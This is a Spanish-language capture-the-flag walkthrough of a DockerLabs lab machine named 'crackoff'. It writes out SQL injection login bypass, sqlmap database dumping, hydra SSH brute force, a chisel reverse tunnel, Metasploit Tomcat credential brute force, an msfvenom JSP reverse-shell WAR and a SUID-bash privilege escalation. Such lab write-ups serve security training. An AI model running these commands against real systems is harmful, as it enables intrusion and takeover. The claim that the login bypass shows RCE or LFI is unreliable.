@@ -1,0 +1,131 @@
+nmap: 22,80
+
+![[dockerlabs/dificil/crackoff/nmap.png]]
+
+---
+
+entramos a la pagina principal
+
+![[dockerlabs/dificil/crackoff/pagina principal.png]]
+
+En el login de la pagina
+
+![[dockerlabs/dificil/crackoff/login.png]]
+
+probamos un sql básico " 'or 1=1-- -" y nos da acceso al panel de control, o sea es vulnerable a un RCE o LFI.  y buscando que mas hacer par obtener algún usuario o algo, encontré que podemos ver la base de datos por esto:
+
+![[dockerlabs/dificil/crackoff/panel1.png]]
+
+probamos con la base de datos
+
+    sqlpmap --url http://172.17.0.2/login.php --forms --batch --dbs
+
+![[sql1.png]]
+
+ahora mas especifico:
+
+    qlmap --url http://172.17.0.2/login.php --forms --batch --dbs --time-sec=1 --dump
+
+nos da después de un rato una tabla con usuarios y contraseñas posibles:
+
+![[tabla.png]]
+
+creamos en nuestra terminal un txt de pass y user. 
+luego un hydra para que pruebe combinaciones: 
+
+    hydra -L user.txt -P pass.txt ssh://172.17.0.2 -vV
+
+nos dio: 
+![[contraseña.png]]
+
+entramos por el ssh
+![[dockerlabs/dificil/crackoff/ssh.png]]
+
+y vemos que hay tres usuarios: Alice, Mario y rosa que somos nosotros.
+
+escalamos: encontré esta nota  
+![[dockerlabs/dificil/crackoff/nota.png]]
+![[nota2.png]]
+el contenido de la nota: flowerpower
+probé si era la contraseña pero no es
+buscando probé con el comando 
+
+     netstat -an
+
+y me dio esto que me llamo la atención
+![[8080.png]]
+
+descargamos chisel: https://github.com/jpillora/chisel/releases/tag/v1.10.0
+
+gunzip chisel
+y lo pasamos a la maquina victima con wget mientras tenemos el servidor abierto en nuestra terminal. 
+
+    wget http://172.17.0.2/chisel
+
+![[chisel.png]]
+
+iniciamos en nuestra terminal un servidor: 
+
+    ./chisel server -p 1234 --reverse
+y en la maquina víctima: 
+
+    ./chisel client 172.17.0.1:1234 R:443:127.0.0.1:8080
+
+![[dockerlabs/dificil/crackoff/conexion1.png]]
+
+entonces entramos al puerto 8080 por el 443:
+http://127.0.0.1:443/
+![[tomcat.png]]
+
+ahora empezamos a escalar hacia los otros usuarios a través de "manager app" de la pagina tomcat.
+
+como ninguna credencial que buscamos en: https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-web/tomcat
+
+sirvió mas abajo en la misma pagina nos muestra que busquemos por metasploit:
+
+hacemos una fuerza bruta  a través de metasploit con los siguientes pasos:
+
+     - use auxiliary/scanner/http/tomcat_mgr_login
+     - set RHOSTS 127.0.0.1
+     - set RPORT 8080
+     - set USER_FILE /home/skopjee/user.txt
+     - set PASS_FILE /home/skopjee/pass.txt
+     - set TARGETURI /manager/html
+     - run
+y nos dio
+
+    [+] 127.0.0.1:8080 - Login Successful: tomitoma:supersecurepasswordultra
+
+
+ingresamos a mager app
+![[panel2.png]]
+
+creamos un archivo malicioso: 
+
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f war -o rev.war
+
+lo subimos en el apartado de "WAR"
+![[dockerlabs/dificil/crackoff/war.png]]
+
+cargamos y a parecerá en la parte principal de la pagina como "rev"
+![[rev.png]]
+
+ahora colocamos el terminal en escucha y nos conectamos
+![[dockerlabs/dificil/crackoff/conexion2.png]]
+
+luego de conectarme buscamos como llegar a root:
+![[catalina.png]]
+
+escalamos privilegios con sh:
+
+    echo 'chmod u+s /bin/bash' >> /opt/tomcat/bin/catalina.sh
+
+ahora lo iniciamos
+
+     sudo -u root /opt/tomcat/bin/catalina.sh start
+
+si vemos los permisos bash veremos que cambiaron:
+
+ ![[dockerlabs/dificil/crackoff/root.png]]
+
+y al hace el bash -p seremos root!
